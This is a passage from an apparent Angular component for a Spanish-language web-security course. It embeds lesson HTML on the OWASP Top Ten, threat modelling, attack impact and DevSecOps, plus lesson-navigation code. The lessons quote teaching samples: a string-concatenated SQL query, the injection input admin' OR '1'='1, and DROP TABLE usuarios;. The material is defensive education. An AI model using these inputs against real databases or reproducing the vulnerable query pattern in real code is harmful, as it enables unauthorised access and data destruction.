        <pre><code>"SELECT * FROM usuarios WHERE nombre = '" + entrada + "'"</code></pre>

        <p>
          Si el atacante envía una cadena especialmente diseñada, puede modificar la consulta original. Para prevenir estas fallas, se emplean consultas preparadas, validación estricta y separación entre datos y comandos.
        </p>

        <h2>4. Diseño inseguro</h2>

        <p>
          El diseño inseguro se refiere a la ausencia de decisiones de arquitectura que consideren la seguridad desde el inicio. No se trata de fallas de implementación específicas, sino de estructuras o procesos que permiten comportamientos inseguros. Esto incluye flujos de autenticación débiles, ausencia de controles para operaciones críticas, falta de mecanismos antifraude o dependencias entre componentes que exponen información o funcionalidad interna.
        </p>

        <p>
          Un sistema que permite cambios de contraseña sin verificar la identidad del usuario, o una API que no limita intentos de autenticación, ejemplifica este tipo de problema. En estos casos, incluso si el código está escrito correctamente, la arquitectura general permite ataques debido a omisiones conceptuales en el diseño original.
        </p>

        <h2>5. Configuración incorrecta de seguridad</h2>

        <p>
          La configuración incorrecta es una de las causas más comunes de incidentes. Aparece cuando los servidores, bases de datos, frameworks o servicios externos se encuentran con configuraciones por defecto, características innecesarias habilitadas, versiones obsoletas o permisos excesivos. Estos errores suelen generar puntos de exposición que los atacantes pueden descubrir con herramientas automatizadas.
        </p>

        <p>
          Un caso habitual es un panel administrativo expuesto sin restricciones adicionales, o un servidor que muestra mensajes de error detallados que revelan rutas internas, estructuras de archivos o tecnologías utilizadas. La administración adecuada de configuraciones requiere inventarios completos, eliminación de componentes innecesarios, actualización continua y revisión periódica de permisos.
        </p>

        <h2>6. Vulnerabilidades en componentes externos</h2>

        <p>
          Las aplicaciones modernas dependen de bibliotecas, paquetes, servicios remotos y frameworks desarrollados por terceros. Cuando alguno de estos componentes contiene una vulnerabilidad, la aplicación adopta ese riesgo automáticamente. Este tipo de fallo se convierte en un vector crítico cuando el componente comprometido se encuentra en una parte central del sistema.
        </p>

        <p>
          Un escenario típico ocurre cuando una aplicación utiliza una versión vulnerable de una biblioteca de autenticación o un framework de plantillas que permite la ejecución remota de código. Los atacantes suelen buscar versiones desactualizadas e intentar explotarlas incluso si el código propio de la aplicación no contiene fallas. La gestión de dependencias requiere inventarios, monitoreo de avisos de seguridad y actualización continua.
        </p>

        <h2>7. Fallas de identificación y autenticación</h2>

        <p>
          Los problemas en la autenticación y en la verificación de identidad ocurren cuando la aplicación permite eludir controles que deberían restringir el acceso. Esto se presenta en inicios de sesión mal diseñados, reenvíos de tokens sin validación, reutilización de credenciales, recuperación insegura de contraseñas y fallas al verificar firmas en tokens o sesiones.
        </p>

        <p>
          Un ejemplo claro corresponde a sistemas que aceptan contraseñas débiles, no limitan intentos de autenticación o no invalidan sesiones antiguas. También es frecuente que una API acepte tokens sin verificar la firma o que no implementen expiraciones adecuadas. Estos errores permiten que atacantes obtengan acceso sin requerir técnicas avanzadas.
        </p>

        <h2>8. Fallas en el control de integridad de software y datos</h2>

        <p>
          La integridad garantiza que los datos y el código no han sido modificados de manera no autorizada. Cuando una aplicación confía en entradas externas, archivos cargados por el usuario o dependencias que provienen de repositorios remotos sin validación, se expone a ataques que modifican datos o introducen contenido malicioso.
        </p>

        <p>
          Un caso común ocurre cuando el sistema permite cargar archivos sin validar su firma, tipo o contenido. Si el atacante sube un archivo ejecutable camuflado como imagen, es posible que logre ejecutar instrucciones en el servidor. También ocurre cuando la aplicación descarga scripts externos sin verificar su origen, permitiendo ataques en la cadena de suministro.
        </p>

        <h2>9. Fallas en la monitorización y registro</h2>

        <p>
          La falta de monitoreo adecuado impide detectar actividades sospechosas o responder rápidamente a incidentes. Cuando la aplicación no registra intentos de acceso, errores de autenticación o acciones críticas, es difícil realizar investigaciones posteriores o identificar patrones de ataque.
        </p>

        <p>
          Un ejemplo ocurre cuando un atacante prueba cientos de combinaciones de credenciales y la aplicación no registra estas solicitudes. Sin un sistema de registro adecuado, la organización no puede activar mecanismos de defensa, como bloqueo de IP o alertas internas. El monitoreo constante es esencial para detectar comportamientos anómalos y responder oportunamente.
        </p>

        <h2>10. Falsificación de solicitudes del lado del servidor</h2>

        <p>
          Este tipo de vulnerabilidad aparece cuando la aplicación permite que el servidor realice solicitudes arbitrarias basadas en parámetros proporcionados por el usuario. Un atacante puede utilizar este comportamiento para acceder a recursos internos, interactuar con servicios restringidos o enviar solicitudes a redes que no están expuestas públicamente.
        </p>

        <p>
          Un escenario típico ocurre cuando una aplicación permite que el usuario proporcione una URL para descargar contenido y el servidor intenta obtenerlo directamente. Si no existe validación, el atacante puede enviar direcciones internas, como solicitudes hacia bases de datos, servicios de administración o endpoints sensibles, utilizando al servidor como intermediario para realizar acciones no autorizadas.
        </p>

        <h2>Bibliografía</h2>
        <ul>
          <li>OWASP Foundation, OWASP Top Ten 2021. [Online]. Available:
            <a href="https://owasp.org/Top10" target="_blank">
              https://owasp.org/Top10
            </a>
          </li>

          <li>D. Stuttard and M. Pinto, <i>The Web Application Hacker's Handbook</i>, 2nd ed. Indianapolis, IN, USA: Wiley Publishing, 2011.</li>

          <li>OWASP Foundation, Web Security Testing Guide. [Online]. Available:
            <a href="https://owasp.org/www-project-web-security-testing-guide" target="_blank">
              https://owasp.org/www-project-web-security-testing-guide
            </a>
          </li>

          <li>National Institute of Standards and Technology, Secure Software Development Framework. [Online]. Available:
            <a href="https://csrc.nist.gov" target="_blank">
              https://csrc.nist.gov
            </a>
          </li>

          <li>ENISA, Threat Landscape 2023. [Online]. Available:
            <a href="https://www.enisa.europa.eu" target="_blank">
              https://www.enisa.europa.eu
            </a>
          </li>
        </ul>
      `
    },
    'modelo-amenazas-vectores': {
      id: 'modelo-amenazas-vectores',
      title: 'Modelo de amenazas y vectores de ataque frecuentes',
      description: 'Cómo se identifican y clasifican las amenazas en la web.',
      category: 'security-basics',
      htmlContent: `
        <p>
          El modelo de amenazas es una metodología que permite identificar, clasificar y comprender los riesgos que enfrenta una aplicación web antes, durante y después de su operación. Su propósito es determinar qué actores podrían atacar el sistema, qué objetivos persiguen, qué activos buscan comprometer y qué vectores podrían utilizar para lograrlo. Elaborar un modelo de amenazas es un paso fundamental en la arquitectura segura, ya que proporciona una visión sistemática de los puntos donde la aplicación es vulnerable y facilita la implementación de controles adecuados para reducir el riesgo.
        </p>

        <p>
          Cuando se evalúa una aplicación web, se analizan aspectos como la superficie de exposición, la forma en que se manejan los datos sensibles, los componentes externos que participan en el flujo de información y los caminos técnicos que un atacante podría aprovechar para manipular solicitudes, falsificar identidades o extraer información. Este análisis no se limita a escenarios extremadamente avanzados; incluso un atacante con conocimientos básicos puede explotar errores simples en la validación de entradas, en la gestión de sesiones o en la configuración del servidor para tomar control parcial o total del sistema.
        </p>

        <p>
          El objetivo principal de un modelo de amenazas es hacer visible aquello que un atacante vería. Identificar estas áreas antes de que ocurran incidentes permite implementar defensas específicas en la arquitectura, en el código y en las configuraciones.
        </p>

        <h2>Actores de amenaza y sus motivaciones</h2>

        <p>
          Los actores que representan un riesgo para una aplicación pueden ser muy distintos entre sí. Los más comunes incluyen atacantes externos que buscan vulnerar la aplicación desde internet para obtener información o causar daño. También existen atacantes internos que, aprovechando acceso legítimo, ejecutan acciones no autorizadas. Finalmente, existen actores automatizados, como bots y escáneres, que rastrean aplicaciones en busca de fallos conocidos que explotar de manera masiva.
        </p>

        <p>
          Las motivaciones varían desde intereses económicos, acceso a información confidencial, obtención de control sobre recursos del servidor, interrupción del servicio o incluso uso de la aplicación como punto de entrada a redes más amplias. Comprender quién podría atacar la aplicación y por qué permite priorizar mejor los controles de seguridad.
        </p>

        <h2>Vectores de ataque relacionados con la entrada de datos</h2>

        <p>
          Uno de los vectores más comunes y peligrosos es la manipulación de datos de entrada. Cualquier campo que reciba información del usuario, ya provenga de formularios, parámetros en la URL, encabezados HTTP o archivos cargados, constituye un punto de exposición. La validación insuficiente de estos datos permite que los atacantes introduzcan instrucciones inesperadas o alteren la lógica interna del sistema.
        </p>

        <p>
          Un ejemplo de este tipo de vector aparece en el siguiente escenario típico. Supongamos que una aplicación recibe un parámetro llamado <strong>usuario</strong> para autenticar al cliente. Si este parámetro se utiliza directamente en una consulta SQL sin validación, un atacante podría enviar una entrada como la siguiente:
        </p>

        <pre><code>admin' OR '1'='1</code></pre>

        <p>
          Si el código vulnerable construye dinámicamente la cadena SQL, esa entrada puede modificar el comportamiento previsto y devolver acceso indebido. Este tipo de manipulación es la base de ataques como inyección SQL, inyección LDAP, inyección de comandos y otros ataques similares que afectan sistemas mal protegidos.
        </p>

        <h2>Vectores de ataque asociados al manejo del estado</h2>

        <p>
          La gestión del estado, especialmente a través de sesiones y cookies, también representa un vector crítico de ataque. Si una aplicación conserva el Session ID en una cookie sin atributos de seguridad o si el servidor no invalida correctamente las sesiones caducadas, un atacante podría interceptar o reutilizar ese identificador para suplantar al usuario original.
        </p>

        <p>
          Un ejemplo simplificado que ilustra este riesgo es el siguiente. Si una cookie contiene un identificador como:
        </p>

        <pre><code>Set-Cookie: session_id=XYZ123</code></pre>

        <p>
          pero carece de los atributos <code>Secure</code> o <code>HttpOnly</code>, un atacante que capture tráfico en una red abierta puede obtenerla sin mayores dificultades y reutilizarla para enviar solicitudes autenticadas. Este tipo de vulnerabilidad es especialmente grave en arquitecturas que dependen exclusivamente de la cookie para gestionar permisos.
        </p>

        <p>
          Además, las aplicaciones pueden ser vulnerables a ataques de fijación de sesión cuando permiten que un atacante defina previamente el identificador que usará la víctima. Esto ocurre cuando la aplicación no genera un nuevo Session ID después del inicio de sesión, permitiendo que el atacante controle la sesión resultante.
        </p>

        <h2>Vectores relacionados con la lógica de la aplicación</h2>

        <p>
          Más allá de las fallas técnicas en validación o configuración, muchos ataques se basan en errores en la lógica de negocio y en la secuencia de pasos que debe seguir un usuario. Un ejemplo común se presenta cuando una aplicación permite realizar una operación crítica sin verificar que el usuario tenga permiso para ello. Esto suele ocurrir cuando se confía únicamente en el contenido visible del cliente o cuando el servidor no valida que la acción corresponda al usuario autenticado.
        </p>

        <p>
          Considere el siguiente ejemplo realista. Una aplicación permite a un usuario actualizar su perfil mediante una solicitud <code>POST</code> hacia una ruta como:
        </p>

        <pre><code>POST /actualizar_perfil</code></pre>

        <p>
          Si la aplicación solo revisa el identificador enviado en el cuerpo del formulario y no verifica la identidad del usuario en sesión, un atacante podría enviar una solicitud manipulada estableciendo el ID de otra persona, alterando así información de terceros sin autorización.
        </p>

        <p>
          Este tipo de fallas se manifiesta en vulnerabilidades como escalación horizontal de privilegios, manipulación de parámetros o ejecución de acciones sin autorización adecuada.
        </p>

        <h2>Vectores de ataque derivados de la configuración y la infraestructura</h2>

        <p>
          Una aplicación puede ser segura a nivel de código pero vulnerable por errores en su infraestructura o configuración. Servidores que revelan versiones exactas del software, bases de datos expuestas sin autenticación o componentes desactualizados son puntos de entrada frecuentes.
        </p>

        <p>
          Un ejemplo representativo ocurre cuando un servidor expone un panel de administración sin mecanismos adicionales de protección. Una ruta predecible como:
        </p>

        <pre><code>http://servidor.com/admin</code></pre>

        <p>
          puede ser descubierta mediante exploración automatizada. Si la aplicación no implementa controles como autenticación multifactor, restricciones de IP o renombre del panel, el atacante obtiene un acceso privilegiado de manera inmediata si logra descubrir credenciales débiles o reutilizadas.
        </p>

        <p>
          Las vulnerabilidades derivadas de configuraciones erróneas incluyen también el uso incorrecto de permisos en archivos, servicios expuestos sin requerir cifrado o mecanismos que revelan información sensible en mensajes de error. Estos problemas no siempre son evidentes durante el desarrollo, por lo que deben revisarse sistemáticamente mediante pruebas de seguridad y auditorías.
        </p>

        <h2>Vectores relacionados con terceros y componentes externos</h2>

        <p>
          Muchas aplicaciones modernas dependen de librerías, servicios en la nube, plataformas de autenticación o integraciones con sistemas de terceros. Aunque estas dependencias facilitan el desarrollo, también introducen riesgos adicionales. Cualquier componente externo puede contener vulnerabilidades que afectan la seguridad de toda la aplicación.
        </p>

        <p>
          Los ataques a la cadena de suministro se originan cuando un proveedor o componente confiable es comprometido. Al actualizar una librería desde un repositorio público o al integrar un script remoto, la aplicación hereda las vulnerabilidades presentes en ese recurso. Esto ocurrió en numerosos incidentes donde paquetes populares fueron infectados para distribuir código malicioso que se ejecutaba automáticamente al ser incorporado por los desarrolladores.
        </p>

        <p>
          Incluso en casos menos severos, depender de versiones desactualizadas o no aplicar parches representa un vector frecuente de ataque que los adversarios aprovechan mediante escaneos automatizados.
        </p>

        <h2>Bibliografía</h2>
        <ul>
          <li>D. Stuttard and M. Pinto, <i>The Web Application Hacker's Handbook</i>, 2nd ed. Indianapolis, IN, USA: Wiley Publishing, 2011.</li>

          <li>OWASP Foundation, Threat Modeling Cheat Sheet. [Online]. Available:
            <a href="https://owasp.org/www-project-cheat-sheets/cheatsheets/Threat_Modeling_Cheat_Sheet.html" target="_blank">
              https://owasp.org/www-project-cheat-sheets/cheatsheets/Threat_Modeling_Cheat_Sheet.html
            </a>
          </li>

          <li>OWASP Foundation, Top 10 Web Application Security Risks. [Online]. Available:
            <a href="https://owasp.org/Top10" target="_blank">
              https://owasp.org/Top10
            </a>
          </li>

          <li>Microsoft Security Response Center, Introduction to Threat Modeling. [Online]. Available:
            <a href="https://learn.microsoft.com/en-us/security/compass/threat-modeling" target="_blank">
              https://learn.microsoft.com/en-us/security/compass/threat-modeling
            </a>
          </li>

          <li>National Institute of Standards and Technology, Guide for Conducting Risk Assessments. [Online]. Available:
            <a href="https://csrc.nist.gov" target="_blank">
              https://csrc.nist.gov
            </a>
          </li>
        </ul>
    `
    },
    'impacto-operacional': {
      id: 'impacto-operacional',
      title: 'Impacto operativo de los ataques web',
      description: 'Consecuencias reales de incidentes de seguridad en organizaciones.',
      category: 'security-basics',
      htmlContent: `
        <p>
          Los ataques contra aplicaciones web no solo comprometen datos, sino que afectan directamente la continuidad operativa de las organizaciones. Una aplicación comprometida puede perder disponibilidad, alterar su comportamiento, ser utilizada para actividades maliciosas o quedar inservible durante horas o días. El impacto operativo suele ser inmediato y puede extenderse a departamentos completos, proveedores, clientes y socios comerciales.
        </p>

        <p>
          Cuando un atacante obtiene acceso a un servidor o a una aplicación crítica, la organización puede enfrentarse a interrupciones en servicios esenciales, pérdida de productividad, daño a infraestructura tecnológica y la necesidad de activar procedimientos de emergencia. A diferencia de un error funcional ordinario, un ataque exitoso no se limita a una zona del sistema, sino que puede desencadenar fallos en cadena que afectan múltiples componentes y procesos internos.
        </p>

        <p>
          En muchos incidentes, el tiempo de recuperación es mayor que el tiempo de ataque. La identificación del daño, la restauración de sistemas, la validación de integridad y la reactivación de servicios involucran múltiples equipos técnicos. Durante este proceso, la empresa opera de manera parcial o incluso queda completamente suspendida. Esto demuestra que los ataques web no representan únicamente una amenaza técnica, sino un riesgo operativo de alto nivel.
        </p>

        <h2>Afectaciones en la disponibilidad del servicio</h2>

        <p>
          Una de las consecuencias más visibles de un ataque exitoso es la pérdida de disponibilidad. Cuando una aplicación deja de responder, los usuarios perciben de inmediato la falla, lo que afecta actividades comerciales, servicios internos o procesos automáticos dependientes del sistema.
        </p>

        <p>
          Los ataques que provocan esta afectación incluyen desde inyecciones que rompen la lógica del servidor hasta sabotajes intencionales que alteran configuraciones críticas. Incluso una vulnerabilidad que permite la ejecución de una sola instrucción maliciosa puede dejar un sistema fuera de servicio.
        </p>

        <p>
          Un ejemplo claro es la explotación de una vulnerabilidad que permite al atacante ejecutar código dentro del servidor. Si este código fuerza un reinicio continuo, elimina archivos necesarios o consume todos los recursos disponibles, la aplicación queda inutilizada. En entornos donde la disponibilidad es esencial, como sistemas de pago, portales de servicios públicos o plataformas educativas, estas interrupciones representan un impacto severo en la operación diaria.
        </p>

        <h2>Pérdida o alteración de datos críticos</h2>

        <p>
          Los ataques que permiten modificar o eliminar información suelen tener un impacto mucho más profundo que un simple error momentáneo. Cuando los datos son destruidos o manipulados, las operaciones que dependen de esa información también quedan comprometidas. Esto puede afectar registros de clientes, información financiera, historiales de actividad, configuraciones del sistema o cualquier otro elemento esencial para el funcionamiento de la aplicación.
        </p>

        <p>
          Una vulnerabilidad que permite ejecutar consultas SQL sin control es suficiente para alterar registros clave o incluso borrar tablas completas. Una consulta maliciosa como:
        </p>

        <pre><code>DROP TABLE usuarios;</code></pre>

        <p>
          ilustra cómo un atacante puede interrumpir operaciones de forma inmediata. Además de la interrupción operativa, la pérdida de datos suele requerir restauraciones desde respaldos. Si estos respaldos no están actualizados, parte de la información puede perderse de forma permanente, lo que afecta informes, procesos administrativos o funciones críticas que dependan de datos recientes.
        </p>

        <p>
          En casos donde los datos son modificados de manera silenciosa y no destruidos, el impacto puede ser aún más peligroso, ya que los sistemas continúan operando bajo información incorrecta, afectando decisiones, transacciones y reportes sin que se detecte el problema de inmediato.
        </p>

        <h2>Uso malicioso de infraestructura comprometida</h2>

        <p>
          Cuando un atacante obtiene control sobre recursos de la aplicación, estos pueden ser utilizados para actividades maliciosas que no están directamente relacionadas con la aplicación original, pero que generan un impacto operativo significativo. Los atacantes suelen aprovechar servidores comprometidos para enviar correos masivos fraudulentos, alojar contenido ilegal, distribuir malware o realizar ataques coordinados contra otros sistemas.
        </p>

        <p>
          Un servidor comprometido también puede ser integrado en una red de equipos controlados de manera remota, conocida como botnet. En estos casos, el servidor afectado forma parte de operaciones más amplias sin el conocimiento del propietario, lo que puede generar sanciones, bloqueos de red, alertas de proveedores de servicio e incluso investigaciones legales.
        </p>

        <p>
          Además, una infraestructura comprometida pierde su confiabilidad. Aun si no se percibe daño inmediato, el simple hecho de que un atacante tenga acceso implica que cualquier archivo, proceso o configuración puede haber sido alterada. Esto obliga a realizar auditorías exhaustivas y, en casos severos, reconstruir completamente el sistema.
        </p>

        <h2>Alteración de procesos internos y flujo de trabajo</h2>

        <p>
          Los ataques que comprometen la lógica de una aplicación suelen repercutir directamente en el flujo de trabajo de la organización. Cuando un atacante modifica permisos, roles, valores de parámetros o estados de procesos internos, la aplicación puede ejecutar acciones inapropiadas o permitir operaciones fuera de lugar. Esto altera la manera en que los empleados y sistemas automáticos interactúan con la plataforma.
        </p>

        <p>
          Por ejemplo, si una vulnerabilidad permite a un atacante modificar privilegios de usuario, un empleado sin certificación puede obtener permisos administrativos y ejecutar acciones críticas. Asimismo, si se altera un proceso de aprobación o verificación, el sistema puede aceptar transacciones inválidas, solicitudes fraudulentas o cambios no autorizados que se propaguen a otros sistemas corporativos.
        </p>

        <p>
          Estas alteraciones afectan directamente la calidad del servicio, el cumplimiento normativo y la integridad de los flujos internos, lo que convierte este tipo de ataque en una amenaza relevante incluso cuando no se produce una interrupción completa del sistema.
        </p>

        <h2>Interrupción de operaciones dependientes de terceros</h2>

        <p>
          Las aplicaciones modernas rara vez funcionan de manera aislada. La mayoría interactúa con servicios de terceros como plataformas de pago, sistemas de autenticación, servidores de correo, APIs externas o proveedores de almacenamiento. Cuando un ataque compromete la forma en que la aplicación consume estos servicios, el impacto se extiende más allá de la aplicación principal.
        </p>

        <p>
          Si un atacante manipula solicitudes enviadas a un proveedor externo, puede generar fallos en cascada que afecten pagos, notificaciones, registros de auditoría o cualquier otro componente que deje de funcionar de manera adecuada. Esto no solo genera interrupciones, sino que ralentiza procesos internos y obliga a realizar revisiones manuales para determinar qué operaciones fueron procesadas correctamente y cuáles pudieron haber sido alteradas.
        </p>

        <h2>Daño reputacional y pérdida de confianza del usuario</h2>

        <p>
          Aunque el impacto técnico es considerable, uno de los efectos más duraderos de un ataque es la pérdida de confianza de los usuarios. Una aplicación que sufre una brecha o que permanece caída durante horas transmite una imagen de falta de seguridad y de control. La percepción pública es un componente esencial para organizaciones que manejan datos personales, servicios financieros o plataformas educativas.
        </p>

        <p>
          Incluso cuando la empresa logra restaurar el servicio, el usuario puede tomar la decisión de no volver a utilizar la plataforma, especialmente si percibe riesgo para su información personal. Este impacto, aunque intangible, tiene repercusiones económicas, comerciales y operativas a largo plazo.
        </p>

        <h2>Bibliografía</h2>
        <ul>
          <li>IBM Security, Cost of a Data Breach Report 2023. [Online]. Available:
            <a href="https://www.ibm.com/reports/data-breach" target="_blank">
              https://www.ibm.com/reports/data-breach
            </a>
          </li>

          <li>OWASP Foundation, Web Security Testing Guide. [Online]. Available:
            <a href="https://owasp.org/www-project-web-security-testing-guide" target="_blank">
              https://owasp.org/www-project-web-security-testing-guide
            </a>
          </li>

          <li>ENISA, Threat Landscape 2023. [Online]. Available:
            <a href="https://www.enisa.europa.eu" target="_blank">
              https://www.enisa.europa.eu
            </a>
          </li>

          <li>Cybersecurity and Infrastructure Security Agency, Understanding Denial-of-Service Attacks. [Online]. Available:
            <a href="https://www.cisa.gov" target="_blank">
              https://www.cisa.gov
            </a>
          </li>

          <li>M. Zalewski, <i>The Tangled Web: A Guide to Securing Modern Web Applications</i>. San Francisco, CA, USA: No Starch Press, 2012.</li>
        </ul>
    `
    },
    'ciclo-seguro-devsecops': {
      id: 'ciclo-seguro-devsecops',
      title: 'Introducción al ciclo seguro de desarrollo (DevSecOps)',
      description: 'Metodologías integradas para el desarrollo seguro de software.',
      category: 'security-basics',
      htmlContent: `
        <p>
          El desarrollo moderno de software requiere integrar la seguridad desde el inicio del proyecto y no como una etapa aislada que ocurre después de la implementación. Este enfoque preventivo es fundamental para reducir vulnerabilidades, acortar tiempos de corrección y evitar costos elevados asociados a fallas detectadas en etapas tardías. La filosofía que impulsa este enfoque se conoce como DevSecOps, un modelo que combina prácticas de desarrollo, operaciones y seguridad en un único ciclo continuo.
        </p>

        <p>
          DevSecOps asume que la seguridad es responsabilidad de todos los participantes del proyecto y que debe incorporarse de manera natural en cada fase del ciclo de vida del software. Desde la planificación inicial hasta el despliegue en producción, cada cambio, dependencia, configuración y línea de código debe considerar su impacto sobre la integridad, la confidencialidad y la disponibilidad del sistema. Esto evita que la seguridad dependa exclusivamente de auditorías posteriores y permite que las aplicaciones se construyan con mecanismos protectores desde su diseño.
        </p>

        <h2>Integración temprana de la seguridad</h2>

        <p>
          Una de las ideas centrales de DevSecOps es integrar prácticas de seguridad desde las primeras fases del ciclo de desarrollo. Esto implica revisar requisitos funcionales con criterios de seguridad, identificar activos críticos, establecer tolerancias de riesgo y anticipar posibles escenarios de ataque. Incorporar esta perspectiva temprana facilita la construcción de arquitecturas más robustas y reduce la probabilidad de que decisiones iniciales generen puntos de exposición difíciles de corregir más adelante.
        </p>

        <p>
          Durante la etapa de diseño, los equipos analizan flujos de información, modelos de amenazas y dependencias externas para definir controles preventivos antes de escribir el código. Este enfoque permite incluir mecanismos como autenticación sólida, validación rigurosa de entradas, segmentación adecuada de privilegios y uso de componentes confiables antes de que la implementación avance. En contraste con enfoques tradicionales, DevSecOps evita tener que rediseñar estructuras completas cuando se detectan fallas demasiado tarde.
        </p>

        <h2>Automatización como pilar del ciclo seguro</h2>

        <p>
          La automatización es un elemento esencial en el enfoque DevSecOps. Integrar controles automatizados en la cadena de construcción y despliegue garantiza que cada cambio en el código sea evaluado con criterios de seguridad sin depender de intervención manual. Esta automatización puede incluir análisis estático de código, revisión de dependencias vulnerables, escaneo de contenedores, pruebas dinámicas y validación de configuraciones.
        </p>

        <p>
          En una canalización de integración continua, cada vez que un desarrollador realiza un cambio, el sistema ejecuta automáticamente herramientas que identifican patrones peligrosos, librerías obsoletas o configuraciones incorrectas. Esto permite detectar problemas en cuestión de segundos y corregirlos antes de que lleguen a entornos más avanzados. La automatización elimina la repetitividad, incrementa la precisión y facilita que la seguridad se convierta en una práctica cotidiana dentro del proceso de desarrollo.
        </p>

        <p>
          Un ejemplo claro es el uso de análisis estático de código. Cuando un cambio es enviado al repositorio, una herramienta de análisis puede detectar construcciones inseguras como concatenación de parámetros en consultas SQL, validaciones incompletas o uso de funciones peligrosas. De esta forma, el error se corrige antes de desplegar el código, reduciendo significativamente el riesgo de vulnerabilidades explotables.
        </p>

        <h2>Validación continua en todas las fases del ciclo</h2>

        <p>
          DevSecOps propone que la validación no sea un evento aislado, sino un proceso continuo. Esto implica ejecutar pruebas de seguridad en múltiples momentos del ciclo y en distintos niveles de profundidad. Las pruebas estáticas se realizan sobre el código antes de su ejecución, mientras que las pruebas dinámicas se ejecutan sobre la aplicación en funcionamiento. Ambas son complementarias y permiten identificar errores que no serían visibles de otra forma.
        </p>

        <p>
          La validación continua también incluye escaneo de infraestructura, revisión de políticas de acceso, inspección de contenedores, análisis de configuraciones en la nube y monitoreo activo de comportamientos anómalos. Cada componente del sistema, desde la lógica interna hasta los servicios externos, debe evaluarse de manera periódica para detectar desviaciones respecto al estado esperado. Esta revisión frecuente permite reaccionar con rapidez ante cambios no autorizados o configuraciones que puedan poner en riesgo la plataforma.
        </p>

        <h2>Colaboración entre equipos y cultura de responsabilidad compartida</h2>

        <p>
          Un aspecto esencial del modelo DevSecOps es la colaboración constante entre los equipos de desarrollo, operaciones y seguridad. En lugar de que cada área funcione como una unidad aislada, DevSecOps fomenta la comunicación directa y el trabajo conjunto en todas las etapas del proyecto. Esta colaboración reduce fricciones, evita malentendidos técnicos y facilita la integración de controles de seguridad sin comprometer la velocidad de desarrollo.
        </p>

        <p>
          La cultura DevSecOps promueve la idea de responsabilidad compartida. Cada miembro del equipo, independientemente de su rol, debe comprender que su trabajo tiene implicaciones en la seguridad del sistema. Esto implica que los desarrolladores adoptan patrones seguros de programación, los equipos de operaciones aplican configuraciones robustas y los especialistas en seguridad facilitan herramientas y guías que permitan desarrollar con confianza. El objetivo no es que todos los miembros se conviertan en expertos en seguridad, sino que integren prácticas que reduzcan riesgos de manera natural.
        </p>

        <h2>Monitoreo, retroalimentación y mejora continua</h2>

        <p>
          El monitoreo constante es un componente imprescindible dentro de DevSecOps. La aplicación y la infraestructura deben ser observadas en tiempo real para detectar comportamientos inesperados, intentos de ataque o fallos de configuración. Herramientas de monitoreo y registro permiten identificar patrones anómalos como múltiples intentos de inicio de sesión fallidos, variaciones inusuales en el tráfico o errores repetitivos que podrían indicar explotación activa.
        </p>

        <p>
          El análisis posterior de estos eventos permite ajustar las políticas de seguridad, mejorar las configuraciones y optimizar los procesos de desarrollo. La mejora continua es una característica esencial del modelo, ya que el panorama de amenazas cambia constantemente. A medida que surgen nuevas técnicas de ataque o vulnerabilidades recientes en los componentes utilizados, la organización debe adaptar sus controles para mantener la protección del sistema.
        </p>

        <h2>Bibliografía</h2>
        <ul>
          <li>OWASP Foundation, Software Assurance Maturity Model. [Online]. Available:
            <a href="https://owasp.org/www-project-samm" target="_blank">
              https://owasp.org/www-project-samm
            </a>
          </li>

          <li>GitLab, DevSecOps Overview. [Online]. Available:
            <a href="https://docs.gitlab.com" target="_blank">
              https://docs.gitlab.com
            </a>
          </li>

          <li>National Institute of Standards and Technology, Secure Software Development Framework. [Online]. Available:
            <a href="https://csrc.nist.gov" target="_blank">
              https://csrc.nist.gov
            </a>
          </li>

          <li>Red Hat, Understanding DevSecOps. [Online]. Available:
            <a href="https://www.redhat.com" target="_blank">
              https://www.redhat.com
            </a>
          </li>

          <li>D. Stuttard and M. Pinto, <i>The Web Application Hacker's Handbook</i>, 2nd ed. Wiley Publishing, 2011.</li>
        </ul>
    `
    }
  };

  constructor(
    private route: ActivatedRoute,
    private router: Router,
    private lessonProgressService: LessonProgressService
  ) {}

  ngOnInit(): void {
    this.route.params.subscribe(params => {
      const lessonId = params['lessonId'];
      this.loadLesson(lessonId);
    });
  }

  private loadLesson(lessonId: string): void {
    const lesson = this.lessonContent[lessonId];
    if (lesson) {
      this.lessonData = lesson;
      this.calculateStepPosition(lessonId, lesson.category);
      this.updateNavigationState();

      // Track lesson view via backend
      this.trackLessonView(lessonId);
      
      // Check if lesson is completed
      this.checkLessonCompletion(lessonId);
      
      // Initialize section completion tracking
      setTimeout(() => {
        this.initializeSectionTracking(lessonId);
      }, 100);
    } else {
      this.router.navigate(['/dashboard/theory/syllabus']);
    }
  }

  private trackLessonView(lessonId: string): void {
    // Mark lesson as viewed via backend
    this.lessonProgressService.markLessonViewed(lessonId).subscribe({
      next: () => {
        // Lesson marked as viewed
      },
      error: () => {
        // Non-critical error, continue showing lesson
      }
    });
  }

  private checkLessonCompletion(lessonId: string): void {
    // Check if lesson is already completed from the service
    // First check synchronously
    this.isLessonCompleted = this.lessonProgressService.isLessonCompleted(lessonId);
    
    // Also subscribe to completed lessons changes for real-time updates
    this.lessonProgressService.completedLessons$.subscribe({
      next: (completedLessons) => {
        this.isLessonCompleted = completedLessons.includes(lessonId);
      }
    });
  }

  markLessonAsComplete(): void {
    // Check if all section buttons have been clicked
    if (this.totalSections > 0 && this.completedSections.size < this.totalSections) {
      alert(`Debes completar todos los pasos (${this.completedSections.size}/${this.totalSections}) antes de marcar la lección como completada.`);
      return;
    }
    
    if (this.isMarkingComplete || this.isLessonCompleted) {
      return;
    }

    this.isMarkingComplete = true;
    const lessonId = this.lessonData.id;

    // Mark lesson as completed via backend
    this.lessonProgressService.markLessonCompleted(lessonId).subscribe({
      next: () => {
        this.isLessonCompleted = true;
        this.isMarkingComplete = false;
        
        // Force refresh of progress stats to update counts across all components
        this.lessonProgressService.getProgressStats().subscribe({
          next: () => {
            // Progress stats refreshed - the count will automatically update
            // when all steps in the category are completed
          },
          error: () => {
            // Error refreshing stats (non-critical)
          }
        });
      },
      error: () => {
        this.isMarkingComplete = false;
        alert('Error al marcar la lección como completada. Por favor, intenta de nuevo.');
      }
    });
  }

  private calculateStepPosition(lessonId: string, category: string): void {
    const categoryLessonsList = this.categoryLessons[category as keyof typeof this.categoryLessons];
    if (categoryLessonsList) {
      this.currentStep = categoryLessonsList.indexOf(lessonId) + 1;
      this.totalSteps = categoryLessonsList.length;
    } else {
      this.currentStep = 1;
      this.totalSteps = 1;
    }
  }

  private updateNavigationState(): void {
    this.hasPreviousLesson = this.currentStep > 1;
    this.hasNextLesson = this.currentStep < this.totalSteps;
  }

  navigateBack(): void {
    this.router.navigate(['/dashboard/theory']);
  }

  navigateToPrevious(): void {
